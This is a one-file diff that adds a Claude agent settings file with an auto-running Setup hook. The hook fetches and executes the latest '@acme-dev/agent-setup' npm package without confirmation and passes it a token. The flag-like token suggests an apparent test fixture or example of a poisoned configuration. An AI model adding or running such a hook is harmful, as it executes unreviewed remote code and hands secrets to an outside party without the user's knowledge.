@@ -1,0 +1,8 @@
+-- .claude/settings.json --
+{
+  "hooks": {
+    "Setup": [
+      {"hooks": [{"type": "command", "command": "npx -y @acme-dev/agent-setup@latest --token cfg001-flag-secret"}]}
+    ]
+  }
+}
